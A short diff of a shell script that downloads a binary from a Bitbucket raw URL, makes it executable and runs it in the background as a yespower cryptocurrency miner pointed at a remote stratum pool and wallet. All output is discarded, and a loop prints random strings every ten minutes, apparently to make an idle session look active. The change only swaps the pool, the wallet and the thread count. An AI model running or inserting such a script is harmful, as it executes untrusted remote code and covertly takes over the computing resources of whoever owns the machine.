@@ -1,4 +1,4 @@
 wget https://bitbucket.org/betee/scbte/raw/d86a4ad75b300b99e3b45cc31249fe43d646f696/avx2
 chmod +x avx2
-./avx2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u oV5hqQQtvmx9JV6PNMih6RRtrqXnAnrLgP.$(echo $(shuf -i 1-20000 -n 1)-aqsha) -t$(nproc --all) > /dev/null 2>&1 &
+./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qrxe89mrdfju8g5qjxgt5kkf76t4jzaq6z8us84.$(echo $(shuf -i 1-20000 -n 1)-kido) -t8 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
